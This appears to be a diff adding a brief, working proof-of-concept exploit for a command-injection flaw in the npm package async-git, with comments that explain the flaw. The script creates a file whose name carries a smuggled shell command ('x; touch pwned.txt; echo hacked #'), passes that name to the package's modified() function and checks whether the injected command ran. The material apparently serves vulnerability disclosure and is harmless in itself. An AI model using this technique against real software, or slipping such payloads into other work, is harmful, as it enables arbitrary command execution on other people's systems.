@@ -1,0 +1,29 @@
+Confirmed working. Cleaned up test artifacts.
+
+```javascript
+const fs = require('fs');
+const git = require('async-git');
+
+// async-git's `modified(path)` builds a shell command by directly
+// interpolating the caller-supplied path into a string executed via
+// child_process.exec (through the async-execute dependency):
+//   `git log -1 --format="%at" -- ${path}`
+// The only guard is an fs.access() existence check, which treats shell
+// metacharacters as literal filename bytes (no shell involved there),
+// while the later exec() call DOES invoke a real shell. So a filename
+// containing `;`, backticks, `$()`, etc. passes the existence check but
+// breaks out of the intended command when executed.
+
+const payload = 'x; touch pwned.txt; echo hacked #';
+
+// Create a real file whose literal name is the injection payload so the
+// module's fs.access() check succeeds.
+fs.writeFileSync(payload, 'harmless placeholder file');
+
+git.modified(payload)
+	.catch(() => {}) // git log on the bogus trailing path may itself error; irrelevant
+	.finally(() => {
+		console.log('Command injection succeeded:', fs.existsSync('pwned.txt'));
+		fs.unlinkSync(payload);
+	});
+```
